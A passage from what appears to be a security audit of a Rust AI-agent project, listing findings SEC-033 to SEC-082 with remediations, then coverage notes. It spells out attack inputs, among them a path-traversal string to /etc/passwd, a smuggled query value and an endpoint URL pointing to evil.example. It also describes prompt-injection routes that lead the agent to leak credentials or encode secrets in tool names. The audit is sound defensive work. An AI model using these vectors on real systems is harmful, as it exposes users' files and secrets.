- **Attack vector:** `fetch_run_logs` buffers the entire unbounded response, then per-entry `read_to_string`/`read_to_end` with no per-entry cap; the `MAX_LOG_EXCERPT_BYTES` check runs only *before* each read.
- **Impact:** Memory exhaustion/OOM from a crafted log archive.
- **Remediation:** Stream the download with a hard byte limit and wrap each entry read in `.take(MAX_LOG_EXCERPT_BYTES)`.

### SEC-033 — API-supplied URL is still fetched cross-origin (SSRF, token withheld)
- **Severity:** Low · **Crate:** `ragent-tools-vcs`
- **Location:** `github/client.rs:277-300`, `gitlab/client.rs:519-534`
- **Attack vector:** Both clients withhold the credential on a cross-origin URL but still issue the request, so a compromised/malicious instance can make the agent GET arbitrary internal addresses (`169.254.169.254`, `127.0.0.1:<port>`).
- **Impact:** Blind/semi-blind SSRF and internal port probing; no credential leak.
- **Remediation:** Refuse the fetch entirely for a cross-origin API-supplied URL.

### SEC-034 — GitLab `labels` filter interpolated into the query string unencoded
- **Severity:** Low · **Crate:** `ragent-tools-vcs`
- **Location:** `crates/ragent-tools-vcs/src/gitlab/gitlab_issues.rs:72-76` → `gitlab/client.rs:83`
- **Attack vector:** Unlike the GitHub sibling (which uses `urlencoded`), the value is formatted directly (`path.push_str(&format!("&labels={labels}"))`), so `bug&per_page=100&state=closed` injects query params.
- **Impact:** Query-parameter injection against the configured GitLab API with the user's PAT (host/path fixed).
- **Remediation:** Route through `crate::percent::encode_component`.

### SEC-035 — `http_request` forwards caller-supplied credential headers across a cross-host redirect
- **Severity:** Medium · **Crate:** `ragent-tools-extended`
- **Location:** `src/http_request.rs:25-49` (deny-list) + `:139-152` (sink), redirect at `src/masterfetch/http.rs:90`
- **Attack vector:** The deny-list blocks `authorization`/`cookie`/`host`/`proxy-*` but not `x-api-key`, `Private-Token`, `x-goog-api-key`, etc. A prompt-injected instruction makes the agent call `http_request` with such a header against an attacker URL that 302s to a second host; reqwest's `remove_sensitive_headers` only strips `Authorization`/`Cookie` on a cross-host hop.
- **Impact:** Exfiltration of arbitrary request credentials (and any 307/308 body) to a third-party host.
- **Remediation:** Treat every non-allowlisted header as sensitive (allow only `accept`, `accept-language`, `content-type`, `user-agent`) and/or pin `http_request`'s redirect policy to `Policy::none()`.

### SEC-036 — Response bodies are buffered in full before the size cap is applied
- **Severity:** Medium · **Crate:** `ragent-tools-extended`
- **Location:** `src/http_request.rs:181-184` (`response.bytes()`), `src/masterfetch/http.rs:181-186` (`response.text()`)
- **Attack vector:** A hostile origin returns an arbitrarily large body (inflated by transparent gzip/deflate); the cap is applied only after the whole body is materialised.
- **Impact:** Memory exhaustion/OOM from a single tool call.
- **Remediation:** Reimplement `read_body_capped` on the existing streaming `read_bytes_capped` and make `http_request` use it.

### SEC-037 — SSRF localhost filter bypassed by a trailing-dot hostname (`localhost.`)
- **Severity:** Medium · **Crate:** `ragent-tools-extended`
- **Location:** `src/masterfetch/security.rs:220-251` (sink `:224`)
- **Attack vector:** `validate_url("http://localhost./")` yields `HostKind::Domain("localhost.")`; the localhost check compares exact `"localhost"`/`"local"`, and `normalise_ip_notation` returns `None`, so validation passes — resolvers still map `localhost.` to `127.0.0.1`.
- **Impact:** Reachability of loopback-only services (ragent HTTP server, Ollama endpoints), compounding SEC-014/015.
- **Remediation:** Strip a single trailing `.` and compare against `localhost`/`local`/`localhost.localdomain`.

### SEC-038 — `pdf_read` performs no workspace containment check
- **Severity:** Medium · **Crate:** `ragent-tools-extended`
- **Location:** entry `src/pdf_read.rs:69-73` → sink `src/pdf_read.rs:112-116`; also `src/document_extract.rs:110-112`
- **Attack vector:** `resolve_path` returns an absolute input unchanged and `PdfReadTool::execute` never calls `ctx.check_path_within_workspace(&path)` (unlike `pdf_write`, fixed under SEC-tools-extended-002).
- **Impact:** Arbitrary out-of-workspace file read (PDF text/metadata) anywhere the uid can read; `scripts/check-file-tool-containment.sh` only scans `ragent-tools-core`.
- **Remediation:** Add `ctx.check_path_within_workspace(&path)?;` after `resolve_path`, and extend the CI containment script to the extended document tools.

### SEC-039 — API-key-bearing search engines derive `Debug`, contradicting the "key never logged" contract
- **Severity:** Low · **Crate:** `ragent-tools-extended`
- **Location:** `src/masterfetch/search/langsearch.rs:77-83`, same in `exa.rs:89`, `serper.rs:79`, `tavily.rs:87`, `perplexity.rs:87`
- **Attack vector:** `#[derive(Debug)]` includes the `api_key: String` field, so any future `{:?}`/`debug!` prints the raw key; `masked_key()` exists precisely because it must not be rendered.
- **Impact:** Latent credential disclosure (no current sink, hence Low).
- **Remediation:** Drop the derive and hand-write `Debug` printing `mask_api_key(&self.api_key)`.

### SEC-040 — `mf_fetch` bulk `urls` array is unbounded
- **Severity:** Low · **Crate:** `ragent-tools-extended`
- **Location:** entry `src/masterfetch/tools/fetch.rs:151-159` → sink `:214-230`
- **Attack vector:** `urls` has no length cap (unlike `mf_crawl`'s `MAX_CRAWL_URLS`), and `buffer_unordered(..).collect()` retains every per-URL output (up to 16 MiB each).
- **Impact:** LLM-driven memory growth proportional to array length.
- **Remediation:** Cap the list with a `MAX_BULK_URLS` constant.

### SEC-041 — Container backend workspace confinement bypassed by absolute paths containing `..`
- **Severity:** Medium · **Crate:** `ragent-agent`
- **Location:** `crates/ragent-agent/src/backend/container.rs:769-795` (`container_path`), used at `:645-760`
- **Attack vector:** An absolute path beginning with the workspace prefix returns early from the absolute branch and skips the `ParentDir` rejection: `container_path("/projects", "/projects/../../../etc/passwd")` satisfies `starts_with("/projects/")` and is returned unchanged, then single-quoted into a `sh -lc` script where `..` resolves outside the mount.
- **Impact:** Container file tools read/overwrite/delete anything in the sandbox filesystem instead of being confined to the workspace (FR-035).
- **Remediation:** Run the `ParentDir` rejection (and lexical normalisation) for absolute paths too, and require the normalised path to `starts_with(workspace)`.

### SEC-042 — MCP HTTP client has no request timeout and reads response bodies unbounded
- **Severity:** Medium · **Crate:** `ragent-agent`
- **Location:** `crates/ragent-agent/src/mcp/http.rs:55-57` (`reqwest::Client::new()`) + `:372-375` (`response.text()`)
- **Attack vector:** The shared client carries no timeout, so a stalled Streamable-HTTP MCP server hangs `post` indefinitely (the retry envelope only fires on error); the body is read in full, so a multi-GB stream exhausts memory.
- **Impact:** DoS — one unresponsive/malicious MCP server wedges every tool call routed to it and can OOM the client.
- **Remediation:** Build the client with `.timeout`/`.connect_timeout`/`.redirect(Policy::limited(n))` and bound the response body.

### SEC-043 — Auto-updater replaces the running binary without integrity verification
- **Severity:** Low · **Crate:** `ragent-agent`
- **Location:** `crates/ragent-agent/src/updater/mod.rs:125-150`, asset selection `:67-75`
- **Attack vector:** `download_and_replace` fetches an arbitrary URL, writes it to `<current_exe>.tmp_update`, `chmod 0755`s and `rename`s it over the running binary with no checksum/signature check; the URL is an unvalidated `&str`.
- **Impact:** Arbitrary code execution at update time via a tampered release artifact.
- **Remediation:** Verify a published SHA-256 (or detached signature) before replacing the binary.

### SEC-044 — `dir_size` follows symlinks with no depth bound (stack-overflow DoS)
- **Severity:** Medium · **Crate:** `ragent-codeindex`
- **Location:** `crates/ragent-codeindex/src/lib.rs:519-529` → sink `lib.rs:1593-1610`
- **Attack vector:** `dir_size` recurses on `meta.is_dir()` (which follows symlinks) with no depth/visited guard; a symlink loop under `.ragent/codeindex` makes `codeindex_status` recurse until the stack is exhausted.
- **Impact:** Stack overflow aborts the process — DoS from repository content plus a status poll.
- **Remediation:** Use `file_type()`/`symlink_metadata` and skip symlinks, and add a depth counter.

### SEC-045 — Global edge budget not enforced on the `impl` derivation path
- **Severity:** Medium · **Crate:** `ragent-codeindex`
- **Location:** `crates/ragent-codeindex/src/graph/edges.rs:185-191,229-235` (checked elsewhere) → sink `:251-307` (`derive_impl_edges`)
- **Attack vector:** `derive_impl_edges` pushes up to `2 * MAX_IMPL_CANDIDATES` edges per `impl` symbol with no `MAX_EDGES_PER_PASS` check, over a repo whose symbols are `impl`-dominated; the in-memory `Vec<GraphEdge>` can reach tens of millions of entries.
- **Impact:** Unbounded memory growth during `build_graph`/`full_reindex` (agent-triggerable), inconsistent with the documented guard.
- **Remediation:** Apply the `MAX_EDGES_PER_PASS` check inside both loops of `derive_impl_edges`.

### SEC-046 — C/C++ `find_identifier` recursion bypasses the depth guard
- **Severity:** Medium · **Crate:** `ragent-codeindex`
- **Location:** `crates/ragent-codeindex/src/parser/c_cpp.rs:144-152` → sink `c_cpp.rs:498-514`
- **Attack vector:** Every other walk enters `TreeDepthGuard::enter`; `find_identifier` recurses over `node.children` unguarded, driven by untrusted C/C++ source with deeply nested declarators.
- **Impact:** Stack overflow / process abort from a scanned file.
- **Remediation:** Add `TreeDepthGuard::enter(node)` at the top of `find_identifier`.

### SEC-047 — `limit == 0` silently means "no limit" for reference lookups
- **Severity:** Medium · **Crate:** `ragent-codeindex` (entry in `ragent-tools-extended`)
- **Location:** `crates/ragent-tools-extended/src/codeindex_references.rs:62` → sink `crates/ragent-codeindex/src/store.rs:1197-1204`
- **Attack vector:** `input["limit"].as_u64().map_or(50, |n| n.min(200) as usize)` lets an explicit `limit: 0` through; `find_references_limited(symbol, 0)` re-routes to the unbounded `find_references` (no SQL `LIMIT`).
- **Impact:** Unbounded result set for a common symbol name (memory growth plus a huge tool result injected into context).
- **Remediation:** Clamp in the tool (`|n| n.clamp(1, 200)`) and replace the `limit == 0` branch with a hard ceiling.

### SEC-048 — No symlink check on the SQLite `index.db` path
- **Severity:** Low · **Crate:** `ragent-codeindex`
- **Location:** `lib.rs:129` (entry) → sink `store.rs:124-125` (`Connection::open`)
- **Attack vector:** `FtsIndex::open` gained a symlink refusal for its dir, but `IndexStore::open` opens the db path directly; a committed `.ragent/codeindex/index.db` symlink (or the symlinked `index_dir` of SEC-016) makes SQLite write the link target.
- **Impact:** Arbitrary-path file creation/write outside `.ragent/codeindex` (higher-impact variant covered by SEC-016).
- **Remediation:** Mirror the FTS guard (`symlink_metadata` + `bail!`) and open with `SQLITE_OPEN_NOFOLLOW`.

### SEC-049 — Panic on attacker-controlled retention durations (cleanup / memory-forget)
- **Severity:** Medium · **Crate:** `ragent-storage`
- **Location:** entry `crates/ragent-agent/src/tool/bg.rs:287` and `tool/structured_memory.rs:380` → sink `storage.rs:4286`, `storage.rs:3258`
- **Attack vector:** `older_than_minutes` is an arbitrary `i64` from tool-call JSON, passed to `chrono::Duration::minutes(n)` then `Utc::now() - <duration>`; both are `expect`-backed and panic past the chrono bounds. The same class exists for `memory_forget`'s `older_than_days` (`Duration::days`).
- **Impact:** A model/plugin integer aborts the storage call by panic; any `panic = "abort"` build turns this into a process abort — a DoS on a user-facing path.
- **Remediation:** Use `Duration::try_minutes`/`try_days` + `checked_sub_signed`, mapping failure to an error.

### SEC-050 — Unescaped LIKE pattern in the activity-log kind lookup
- **Severity:** Low · **Crate:** `ragent-storage`
- **Location:** entry `activity_log.rs:746/915` → sink `activity_log.rs:1749-1751`
- **Attack vector:** `find_event_locked` builds `format!("%{kind_tag}%\"{lookup}\"%")` from a model-supplied `tool_call_id`/checkpoint name and binds it to `kind LIKE ?2`. Parameterised (not SQL injection) but not LIKE-escaped, so `%`/`_`/`"` widen the pattern.
- **Impact:** Audit-reconstruction helpers can be steered into pairing/returning the wrong event — corrupted audit view, no write/privilege change.
- **Remediation:** Escape `%`, `_`, `\` with `ESCAPE '\'`, or match the payload precisely.

### SEC-051 — FR-014 "rebuilding" concurrency guard is never enforced
- **Severity:** Low · **Crate:** `ragent-storage`
- **Location:** `storage/src/activity_log.rs:69` (`rebuilding` field), `:166` (`AppendError::RunRebuilding`)
- **Attack vector:** The documented guard is never inserted/consulted; `RunRebuilding` is never constructed, so `rollback_*`/`resume_run` run with no fencing.
- **Impact:** Callers relying on the documented guarantee get none; operations are read-mostly/single-INSERT, so no corrupting interleaving was demonstrated (defence-in-depth).
- **Remediation:** Implement the guard or remove the field, variant, and FR-014 claim.

### SEC-052 — Model-controlled `tool.name` is exported as a metric attribute behind a deny-list redactor
- **Severity:** Medium · **Crate:** `ragent-telemetry`
- **Location:** entry `crates/ragent-agent/src/session/processor.rs:3481-3482` → sink `recorder.rs:445-454` → `instruments.rs:630-641` → `sensitive.rs:91-180`
- **Attack vector:** The tool name is LLM-produced, recorded unconditionally even when not a registered tool, and filtered only by a *deny-list* (`sanitize_attr_value`). Any attacker-chosen short string avoiding those shapes — e.g. a base64/hex encoding of a secret the model read — is exported verbatim to the collector (and any Prometheus scrape).
- **Impact:** Covert exfiltration channel that bypasses the workspace secret redactor. (Tracked upstream as SEC-ragent-telemetry-004 / T-053.)
- **Remediation:** Redact `tool.name` against an allow-list (map to a registry id, emit `unknown` otherwise, or hash).

### SEC-053 — Cleartext gRPC guard bypassed by userinfo in the endpoint URL
- **Severity:** Low · **Crate:** `ragent-telemetry`
- **Location:** `subsystem.rs:652-678`
- **Attack vector:** "loopback" is decided by string-splitting the raw endpoint (`trim_start_matches("http://").split(['/', ':']).next()`), so `http://localhost:4317@evil.example` is accepted as local, but the URL parser resolves the host to `evil.example` and no TLS is configured.
- **Impact:** Metrics (`host.name`, `service.name`, session ids) shipped in cleartext to a non-loopback host; requires user-owned config.
- **Remediation:** Parse once (`endpoint.parse::<http::Uri>()`) and test `uri.host()`, rejecting any authority containing `@`.

### SEC-054 — Prometheus scrape server has no read timeout and serves one connection at a time
- **Severity:** Low · **Crate:** `ragent-telemetry`
- **Location:** `prometheus.rs:356-417`
- **Attack vector:** Any local process connects to `127.0.0.1:<internal_port>` and sends nothing; `sock.read()` has no deadline, parking the single accept loop and blocking all later scrapes.
- **Impact:** Persistent denial of the local metrics endpoint (diagnostics loss). No effect on the agent loop.
- **Remediation:** Set a read timeout and `tokio::spawn` each connection handler.

### SEC-055 — OTLP endpoint URL (may embed userinfo) is echoed verbatim into `Debug` and errors
- **Severity:** Low · **Crate:** `ragent-telemetry`
- **Location:** `subsystem.rs:474-483`, `:500-513`, `:670-673`
- **Attack vector:** `telemetry.otel.endpoint` may carry `https://user:secret@collector:4318`; it is placed into the `Debug` output and error strings logged by the binary, and the pattern-based redactor does not match a bare `user:secret` in userinfo.
- **Impact:** Collector credentials written to the log file / TUI log panel whenever telemetry initialises or fails.
- **Remediation:** Mask the userinfo component before any `Debug`/error/`tracing` sink.

### SEC-056 — Panic on non-ASCII schedule input (byte index from `to_lowercase()` applied to the original)
- **Severity:** Medium · **Crate:** `ragent-types`
- **Location:** `crates/ragent-types/src/cron.rs:672-681` → `&rest[every_pos + 5..]`
- **Attack vector:** Reached from `cron_add`, TUI `/cron add`, and the automation scheduler. `parse_from` computes `every_pos` in `rest.to_lowercase()` (a full Unicode mapping that changes byte length) then indexes the original `rest`. For `from İeveryé` the offset lands inside a multi-byte char and the slice panics.
- **Impact:** Reachable panic from untrusted LLM/user input; unwinds the TUI event loop or kills the scheduler task — availability impact.
- **Remediation:** Search case-insensitively on `rest` itself (length-preserving `to_ascii_lowercase` or a `char_indices`/`windows` find).

### SEC-057 — Panic from an unbounded duration passed to `chrono::Duration::seconds`
- **Severity:** Medium · **Crate:** `ragent-types`
- **Location:** `crates/ragent-types/src/cron.rs:219-220` (`parse_duration`), sinks `cron.rs:702`, `427`, `475`
- **Attack vector:** `parse_duration` guards only against `i64` overflow; the result can exceed the chrono `TimeDelta` bound and `chrono::Duration::seconds` panics. `every 3558000000000mo` passes and panics in `parse_every`; the same unchecked add runs on a serde-deserialised `CronSchedule.duration_secs` in `initial_next_due`/`advance_next_due`.
- **Impact:** Reachable panic (DoS) from an LLM schedule string and from a tampered/imported session record; one such row stops scheduled automation until restart.
- **Remediation:** Reject parsed values above a sane ceiling in `parse_duration`, filter `positive_duration_secs`, and use `Duration::try_seconds` + `checked_add_signed` at each sink.

### SEC-058 — `contained_join` skips the symlink check when the leaf does not exist
- **Severity:** Low · **Crate:** `ragent-types`
- **Location:** `crates/ragent-types/src/guard.rs:242-271`
- **Attack vector:** The check runs only when both `joined.canonicalize()` and `root.canonicalize()` succeed; a not-yet-created leaf fails `canonicalize` (ENOENT), so the raw `joined` path is returned. If an intermediate component is a symlink out of the root, `contained_join(root, "link/shadow")` returns an unchecked path.
- **Impact:** Weaker containment than documented; latent escape for future write callers (no in-repo write call site today).
- **Remediation:** Canonicalise the deepest *existing* ancestor and assert it is inside the canonical root.

### SEC-059 — `atomic_write` follows a pre-placed symlink at its predictable temp path
- **Severity:** Medium · **Crate:** `ragent-specs`
- **Location:** `crates/ragent-specs/src/io.rs:48-66`
- **Attack vector:** The temp path `.‹file›.‹seq›.tmp` uses a per-process monotonic counter (predictable) in the untrusted, repo-committed spec dir, and `fs::write` follows symlinks, so a committed `specs/x/.SPEC.md.0.tmp` symlink makes the write/sync hit the target; the rename then moves the symlink over `SPEC.md`.
- **Impact:** Arbitrary file overwrite with attacker-controlled spec content; `SPEC.md` replaced by a dangling symlink.
- **Remediation:** Use `OpenOptions::new().create_new(true).write(true)` with a random suffix.

### SEC-060 — Unescaped values interpolated into YAML frontmatter
- **Severity:** Low · **Crate:** `ragent-specs`
- **Location:** `crates/ragent-specs/src/manager.rs:439-452` (reached from `:126-184`)
- **Attack vector:** `actor` and re-emitted reviewer names are written into double-quoted YAML scalars without escaping; a value containing `"` or a newline breaks out and injects extra frontmatter lines, re-parsed on next load. The crate already has `yaml_double_quote` for other fields.
- **Impact:** Attacker-influenced metadata injected into persisted frontmatter (no demonstrated privilege gain).
- **Remediation:** Route `actor`/`old`/`new`/reviewers through `yaml_double_quote`.

### SEC-061 — Unauthenticated automation webhook ingress with no signature or origin check
- **Severity:** High · **Crate:** `ragent-server`
- **Location:** `crates/ragent-server/src/routes/automation.rs:51-53` (route) + `:109-126` (sink), mounted public at `routes/mod.rs:217`
- **Attack vector:** `POST /auto/{id}` is on the *outer* (unauthenticated) router. Any client that can reach the port can POST an arbitrary body, which is passed verbatim as prompt context into a full agent turn (`render_prompt` → `process_message`). A cross-site request *is* also possible: the automation definition's id is required, but the route is not CSRF-protected against a browser `fetch` with `Content-Type: text/plain` (a CORS simple request) from any page — `CorsLayer` only governs whether the *response* is readable, not whether the request executes. On a default `ragent serve` the route is reachable from any local process and (unless the operator also sets `openai.token`, which happens to seed `state.auth_token`) its existence does not depend on the bearer token at all.
- **Impact:** Prompt-injection of an autonomous agent run with no credential, plus unauthenticated cost/DoS amplification: there is no rate limiter on this route (`check_rate_limit` guards the other mutating routes). An external attacker can only reach it when the port is exposed, but a browser-based attacker (localhost CSRF) does not need the port exposed.
- **Evidence:**
  ```rust
  Router::new().route("/auto/{id}", post(webhook_ingest))
  ```
- **Remediation:** Require a shared-secret HMAC over the raw body (or move the route behind auth) and apply `check_rate_limit(&state, "webhook")`.

### SEC-062 — `POST /sessions` roots a session at any absolute directory on disk
- **Severity:** Medium · **Crate:** `ragent-server`
- **Location:** `crates/ragent-server/src/routes/mod.rs:423-458`
- **Attack vector:** `CreateSessionRequest.directory` is canonicalised and only checked for existence/`is_dir()`; no containment against an allowed root. An authenticated caller sends `{"directory": "/home/<user>/.ssh"}` and the agent's file tools operate with that as their containment root.
- **Impact:** Post-auth arbitrary file read outside the intended project root.
- **Remediation:** Reject a canonicalised `directory` not inside the configured project root (or `dirs.allowed_roots`), mirroring `first_out_of_root_path`.

### SEC-063 — `GET /events` is admin-wide by default and leaks every session's content
- **Severity:** Medium · **Crate:** `ragent-server`
- **Location:** `routes/mod.rs:691-760` + `sse.rs:661-680`
- **Attack vector:** With no `?session=` the stream forwards every process-wide `Event` (`ToolCallArgs`, `ToolResult` with file contents, `ModelResponse`, all session ids) with no ownership check.
- **Impact:** Any token holder reads the full transcript — source-file contents and model replies — of every other session.
- **Remediation:** Default `session_filter` to denial (require a verified `?session=`) or issue per-session tokens.

### SEC-064 — `first_out_of_root_path` containment fallback bypassable via a pre-existing symlinked directory
- **Severity:** Low · **Crate:** `ragent-server`
- **Location:** `routes/research.rs:87-113` (entry `:536-550`); duplicated in `crates/ragent-research/src/session.rs:3862-3883`
- **Attack vector:** The fallback compares `resolved.starts_with(&canonical_root)` where `resolved` is itself `canonical_root.join(candidate)` (a tautology) and only rejects a literal `ParentDir`; a path whose non-final component is an existing symlink out of the tree passes.
- **Impact:** Limited (existing files canonicalise and are rejected) — a defence-in-depth gap, not a working arbitrary read.
- **Remediation:** Canonicalise the longest existing prefix and require it to be inside `canonical_root`.

### SEC-065 — Unbounded remote allocation in the open-access client
- **Severity:** Medium · **Crate:** `ragent-research`
- **Location:** `crates/ragent-research/src/open_access.rs:124-162`
- **Attack vector:** An OA lookup is driven by a DOI scraped from an untrusted page; a malicious/compromised endpoint returns a multi-GB body that `.text()`/`.json()` buffers and parses in one shot.
- **Impact:** Memory exhaustion / OOM of the research run.
- **Remediation:** Cap the response with a byte-limited reader before `text()`/`json()`.

### SEC-066 — SSRF: OA-recovered URL fetched with no scheme/host validation and default redirects
- **Severity:** Medium · **Crate:** `ragent-research`
- **Location:** `open_access.rs:232-257` → `web_gatherer.rs:2741-2756`
- **Attack vector:** `url_for_pdf`/`url`/EuropePMC `fullTextUrl.url` come straight from remote OA JSON and are fetched verbatim, with no scheme/host restriction and default redirect following.
- **Impact:** SSRF against internal services/cloud metadata; the body is stored as a captured source.
- **Remediation:** Require `http(s)` and reject private/loopback/link-local/ULA hosts; set an explicit redirect policy.

### SEC-067 — `fetch_with_limit` default buffers the full body before truncating
- **Severity:** Low · **Crate:** `ragent-research`
- **Location:** `crates/ragent-research/src/web_gatherer.rs:839-849`
- **Attack vector:** The default trait impl calls `self.fetch(url)` (unbounded) then truncates to `max_bytes`; any implementor that does not override it buffers the whole body first.
- **Impact:** Large remote responses materialised in memory before the cap (spikes under many parallel fetches).
- **Remediation:** Require implementors to pass `max_bytes` into the fetch (streamed cap) or make the override mandatory.

### SEC-068 — `timeout` wrapper has no `--kill-after`/process-group kill and the budget is fixture-supplied and unbounded
- **Severity:** Medium · **Crate:** `ragent-bench`
- **Location:** `crates/ragent-bench/src/suites/mod.rs:210-231`, sourced from `data.rs:1377` (`execution_timeouts_secs`)
- **Attack vector:** Each command is wrapped as `timeout {timeout_secs}s <program> …`, where `timeout_secs` is an unclamped `u64` from the fixture. `timeout` sends only `SIGTERM` with no group kill, so a command that ignores `SIGTERM` (reachable via SEC-003) or a massive declared budget makes `Command::output()` block indefinitely.
- **Impact:** Attacker-controlled indefinite hang of a benchmark run and orphaned children; contradicts the "can never hang indefinitely" claim.
- **Remediation:** Clamp `timeout_secs` to a small max and invoke `timeout --kill-after=5s --signal=TERM <n>s …`.

### SEC-069 — Dataset downloads have a size cap but no request/read timeout and no redirect restriction
- **Severity:** Medium · **Crate:** `ragent-bench`
- **Location:** `crates/ragent-bench/src/data.rs:909-917`
- **Attack vector:** `reqwest::blocking::Client::new()` has no overall/read timeout and no redirect policy; a slow-loris endpoint holds the init task and redirects are followed freely.
- **Impact:** Unbounded hang of `/bench init --full` (TUI thread / CLI); the byte cap bounds memory, not time.
- **Remediation:** Build the client once with `.timeout(Duration::from_secs(60))` and a limited, https-only redirect policy.

### SEC-070 — Archive extraction allocates the full decompressed entry before the size cap (zip/gzip bomb)
- **Severity:** Medium · **Crate:** `ragent-connectors`
- **Location:** `crates/ragent-connectors/src/manifest.rs:484-538` → sinks `manifest.rs:621-631` (zip), `668-678` (tar.gz)
- **Attack vector:** A ≤50 MiB archive whose entry declares many GB; `entry.read_to_end(&mut body)` decompresses the whole entry into memory **before** `body.len() > MAX_SOURCE_BYTES` and the `total > MAX_EXTRACTED_BYTES` checks run.
- **Impact:** Memory exhaustion / OOM from a hostile archive.
- **Remediation:** Bound the read itself (`entry.take(remaining + 1)`) and fail during decompression.

### SEC-071 — `env`-shape credential name is attacker-controlled and read from the process environment, then handed to the probed server
- **Severity:** Medium · **Crate:** `ragent-connectors`
- **Location:** entry `entry.rs:156,312-321` → `auth.rs:81-84,546-553` → sink `harness.rs:388-391`
- **Attack vector:** A catalogue entry declares `{ "auth":"env", "credential":"AWS_SECRET_ACCESS_KEY" }` plus an attacker-controlled `command`; on `/connectors test <id>` the value is read from ragent's process environment and injected into the spawned server's env.
- **Impact:** The user's arbitrary process secrets (cloud keys, tokens) are handed to an attacker-controlled process.
- **Remediation:** Constrain the `env` variable name to the connector's declared namespace (or require explicit user approval), and never inject an env value whose name came from the descriptor.

## Low

The following are confirmed violations of minimal impact (defence-in-depth, no demonstrated exploit path). Full detail is in the per-crate reports.

- **SEC-072 — `ragent-surface` temp without `O_EXCL`/`O_NOFOLLOW` (symlink clobber).** `config_splice.rs:33-41`; predictable `<name>.json.tmp.<pid>` + `File::create`. Gated on write access to the config dir. → Open with `create_new(true)` + `O_NOFOLLOW`, randomised suffix.
- **SEC-073 — `ragent-surface` unbounded ledger read.** `store.rs:124-126` (`std::fs::read`) before parse. → `metadata().len()` guard / capped reader.
- **SEC-074 — `ragent-connectors` archive download follows redirects to any https host with no hop cap.** `manifest.rs:493-499`. → Use `ragent_surface::net::https_only_redirects()`.
- **SEC-075 — `ragent-plugins` unrecognised manifest shapes silently contribute nothing.** `manifest.rs:1194-1210`. → Set the "unsupported" label so the operator sees the dropped section.
- **SEC-076 — root `src/` startup reads an attacker-controlled marker path (symlink-following, unbounded read).** `main.rs:405` → `crash_dump.rs:178-184`; `last-crash.json` symlinked to `/dev/zero`/FIFO/huge file. → `symlink_metadata` + capped read.
- **SEC-077 — root `src/` `ragent run "!<cmd>"` executes argv through `sh -c` with no validation.** `main.rs:1116,1124-1129`; bypasses the bash tool's 7-layer guard. → Route through the bash validator.
- **SEC-078 — root `src/` untrusted argv echoed to terminal without control-char sanitisation.** `main.rs:448-451,522-524`. → Strip C0/ESC before printing.
- **SEC-079 — `ragent-tui` unbounded file read from untrusted markdown image paths.** `layout.rs:5561-5570` → `app/helpers.rs:383-403`; `![x](/dev/zero)` → OOM. → Reject absolute/`..` non-URL src, capped header read.
- **SEC-080 — `ragent-tui` live transcript renderer does not neutralise bidi/format-override chars.** `layout.rs:7030-7212` vs the unreachable `sanitize_terminal` in `widgets/message_widget.rs:2783`. ratatui filters C0/C1 so escape injection is neutralised; residual is bidi text spoofing. → Sanitise untrusted fragments in the live path.
- **SEC-081 — `ragent-tui` `/webapi enable` writes the bearer token into the chat transcript and log spool.** `slash.rs:10229-10276`; persisted to the session DB/export. → Register with the redaction registry or mask.
- **SEC-082 — `ragent-tui` discovered MCP executable/args persisted and launched without validation.** `session_ops.rs:3906-3936`. → Add a `validate_executable` guard (prior review's finding 2, still unimplemented).

## Notes and coverage gaps

### Crates audited

| Crate / target | Findings (C/H/M/L) |
| -------------- | ------------------ |
| `ragent-config` | 2 / 1 / 2 / 0 |
| `ragent-agent` | 1 / 1 / 2 / 1 |
| `ragent-bench` | 2 / 0 / 2 / 0 |
| `ragent-codeindex` | 0 / 1 / 4 / 1 |
| `ragent-connectors` | 0 / 1 / 2 / 1 |
| `ragent-llm` | 0 / 0 / 2 / 1 |
| `ragent-plugins` | 0 / 2 / 2 / 1 |
| `ragent-research` | 0 / 0 / 2 / 1 |
| `ragent-server` | 0 / 1 / 2 / 1 |
| `ragent-specs` | 0 / 1 / 1 / 1 |
| `ragent-storage` | 0 / 0 / 1 / 2 |
| `ragent-surface` | 0 / 0 / 2 / 2 |
| `ragent-telemetry` | 0 / 0 / 1 / 3 |
| `ragent-tools-core` | 0 / 2 / 2 / 2 |
| `ragent-tools-extended` | 0 / 2 / 4 / 2 |
| `ragent-tools-vcs` | 0 / 2 / 1 / 2 |
| `ragent-tui` | 0 / 0 / 1 / 3 |
| `ragent-types` | 0 / 0 / 2 / 1 |
| root `src/` | 0 / 1 / 0 / 3 |

`ragent-team` and `ragent-bench`'s full test trees were not re-audited (test-only). The prior `ragent-team` findings are covered by `SECTASKS.md`.

### Correctly hardened (verified, no finding)

- **SQL:** every crates' dynamic query builds only `?N` placeholder lists and constant column names; no string-formatted SQL exists (`ragent-storage`, `ragent-codeindex`, `ragent-tools-extended/masterfetch/cache.rs`).
- **LLM redirects:** `create_http_client`/`create_streaming_http_client` set `Policy::none()`; keys are never placed in URLs (Gemini uses the `x-goog-api-key` header).
- **Credential crypto at rest:** `ragent-storage` AEAD (`v3:` ChaCha20-Poly1305) with a per-install key persisted `0600`; DB/WAL/shm `0600`, dirs `0700`.
- **Auth middleware (`ragent-server`):** `route_layer` on the whole protected sub-router; `constant_time_eq` hashes both sides before a fixed-length XOR loop (no length leak).
- **`/config` credential handling:** key-name masking + value-shape scan with a depth bound.
- **Plugin pre-`ToolUse` hooks are dropped** so a plugin cannot influence the permission decision; MCP stdio children spawn in their own process group with `killpg` teardown.
- **`ragent-connectors`:** connector-id confinement, zip/tar `safe_relative_path`, HTTPS-only catalogue endpoints with a byte cap, secret `Debug` redaction, no `unwrap`/`panic`/`unsafe`.
- **`ragent-tui`:** no `unsafe`; all `Command::new` sites use fixed programs + argv slices; clipboard `0o600` temp files; atomic config writes with flock.

### Regression against the prior audit

- **Confirmed fixed:** `multi_edit` containment (T-005), session-archive import bounds (T-008), plugin manifest `id` confinement (T-002), `git` `--`/leading-`-` rejection (T-001), `hooks` hook-approval plumbing (T-007), config JSON parse-error redaction (SEC-ragent-config-007), `sanitize_terminal` bidi/C1 families, `read_body_capped`-adjacent SSE caps, storage AEAD at rest, GitHub/GitLab same-origin token gating (mostly).
- **Still open (re-confirmed):** `ragent-config-004` (config files world-readable → SEC-022) and `ragent-config-005` (malformed deny glob fail-open → SEC-023) are unchanged; `SEC-ragent-telemetry-004`/T-053 (`tool.name` attribute → SEC-052) is still open; the TUI `validate_executable_path` hardening (prior TUI finding 2) is still unimplemented (SEC-082).
